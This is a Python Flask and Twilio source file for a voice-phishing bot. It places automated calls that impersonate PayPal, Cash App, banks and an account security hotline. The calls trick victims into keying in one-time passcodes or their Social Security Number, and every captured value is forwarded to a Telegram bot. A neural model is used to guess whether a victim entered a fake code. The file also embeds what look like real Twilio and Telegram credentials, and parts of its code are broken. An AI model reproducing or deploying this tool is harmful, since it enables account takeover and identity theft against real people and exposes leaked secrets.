from flask import Flask, request, g
import os
import time
import re
import numpy as np
from tensorflow import keras
import math
from flask_caching import Cache
from twilio.twiml.voice_response import VoiceResponse, Gather,Client
import json
import requests
account_sid = 'AC9d71968b6bf85d109997458622a27d9d'
callid = None
auth_token = '3de8ea71ad856404a743dac77709f8c7'
from_number = '+18445121223'
botid = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
model = keras.models.load_model('C:\\Users\\Josep\\OneDrive\\Desktop\\Pilot OTP\\newmod.h5')
app = Flask(__name__)
@app.route("/voice/paypal", methods=['GET', 'POST'])
def voicepaypal():
    resp = VoiceResponse()
    name = request.args.get('name')
    chanid = request.args.get('chanid')
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            gather = Gather(num_digits=6, action='/validate?chanid=' + chanid, timeout=8)
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
            gather.say('We have sent you a 6 digit code. Please enter this code to block this request.', volume=2, voice="alice")
            resp.append(gather)
            print('Code sent')
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
    else:
        gather = Gather(num_digits=1, action='/voice/paypal?chanid=' + chanid, timeout=6)
        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
        gather.say(f'Hello {name}, this is the PayPal fraud prevention hotline. We are calling to inform you about a request to change the number on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
        resp.append(gather)
        print('Call in progress')
    return str(resp)

#CASHAPPP
@app.route("/voice/cashapp", methods=['GET', 'POST'])
def voicecash():
    chanid = request.args.get('chanid')
    resp = VoiceResponse()
    name = request.args.get('name')
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            gather = Gather(num_digits=6, action='/validate?chanid=' + chanid, timeout=8)
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
            print('')
            gather.say('We have sent you a 6 digit code. Please enter this code to block this request and secure your account.', volume=2, voice="alice")
            resp.append(gather)
            print('Code sent')
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
    else:
        gather = Gather(num_digits=1, action='/voice/cashapp?chanid=' + chanid, timeout=6)
        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
        gather.say(f'Hello {name}, this is the Cashapp fraud prevention hotline. We are calling to inform you about a request to withdraw 100 dollars. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
        resp.append(gather)
        print('Call in progress')
    return str(resp)
#CASHAPPEND
#SSN
@app.route("/voice/bank", methods=['GET', 'POST'])
def voicebank():
    chanid = request.args.get('chanid')
    resp = VoiceResponse()
    name = request.args.get('name')
    bankname = request.args.get('bank')
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            gather = Gather(num_digits=6, action='/validate?chanid=' + chanid, timeout=8)
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
            print('')
            gather.say('We have sent you a 6 digit code. Please enter this code to block this request to login to your account.', volume=2, voice="alice")
            resp.append(gather)
            print('Code sent')
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
    else:
        gather = Gather(num_digits=1, action='/voice/bank?chanid=' + chanid, timeout=6)
        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
        gather.say(f'Hello {name}, this is the {bankname} fraud prevention hotline. We are calling to inform you about a request to login to your account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
        resp.append(gather)
        print('Call in progress')
    return str(resp)
@app.route("/voice/ssn", methods=['GET', 'POST'])
def voicessn():
      chanid = request.args.get('chanid')
      resp = VoiceResponse()
      name = request.args.get('name')
      bankname = request.args.get('bank')
      if 'Digits' in request.values:
          choice = request.values['Digits']
          if choice == '1':
              gather = Gather(num_digits=9, action='/validate?chanid=' + chanid, timeout=30)
              requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "The user pressed 1 they will input their SSN soon!"})
              print('')
              gather.say('Please enter your Social Security Number now to block all actions.', volume=2, voice="alice")
              resp.append(gather)
              print('Code sent')
              return str(resp)
          else:
              resp.say("Sorry, I don't understand that choice.")
      else:
          gather = Gather(num_digits=1, action='/voice/ssn?chanid=' + chanid+'&ssn='+'True', timeout=6)
          requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
          gather.say(f'Hello {name}, this is the {bankname} account security hotline. We are calling to inform you about suspicious activity on your account. Preventing your account from these actions will require you to enter your Social Security Number to block such actions. Keep inmind sharing such info can allow to people hack you. Do not share your SSN with anyone else. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
          resp.append(gather)
          print('Call in progress')
      return str(resp)
  
  

@app.route('/validate', methods=['POST'])
def validate():
    resp = VoiceResponse()
    chanid = request.args.get('chanid')  
    codes = [
    "112233",
    "112112",
    "445566",
    "778899",
    "223344",
    "556677",
    "889900",
    "334455",
    "123456",
    "667788",
    "990011",
    "121212",
    "123123",
    "456456",
    "789789",
    "343434",
    "565656",
    "787878",
    "989898",
    "456123",
    "789456",
    "321654",
    "654987",
    "147258",
    "258369",
    "098765",
    "987654",
    "111111",
    "222222",
    "333333",
    "444444",
    "555555",
    "666666",
    "777777",
    "888888",
    "999999",
    "000000",
    "#####0",
    "######",
    "101010"
    ]

    if 'Digits' in request.values:
        digits = request.values['Digits']
        resp.say("Thank You. We will block this request.", volume=2, voice="alice")
        x = np.array([int(digit) for digit in code])
        x_onehot = np.zeros((1, 6, 10))
        for j in range(6):
            digit = int(x[j])
            x_onehot[0, j, digit] = 1
        print(x_onehot)
        prediction = model.predict(x_onehot)
        if prediction[0, 0] > 0.5:
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"⚠️this code is likely human made [🤖Tensorflow AI Flag]"})
            print(prediction)
            print("This code was likely made by a human.")
            print(prediction)
        else:
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"✅this code is likely real [🤖Tensorflow AI Flag]"})
            print(prediction)
        if re.fullmatch(r"\d{9}", digits):
           digits = "{}-{}-{}".format(digits[:3], digits[3:5], digits[5:])
        for code in codes:
          if code == digits:
              requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"⚠️This code might be human made [📖Common input Flag]"})
        repeated = False
        for i in range(0, 4):
            if code.count(code[i:i+3]) > 1:
                repeated == True
        if repeated:
            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"⚠️This code might be human made[🔁Repeted Method Flag]"}),repeated == False


        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"🤳 {digits}\n✅Code captured"})
    else:
        resp.say("Sorry, we did not receive your input. Please try again later.", volume=2, voice="alice")
    
    return str(resp)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8030)
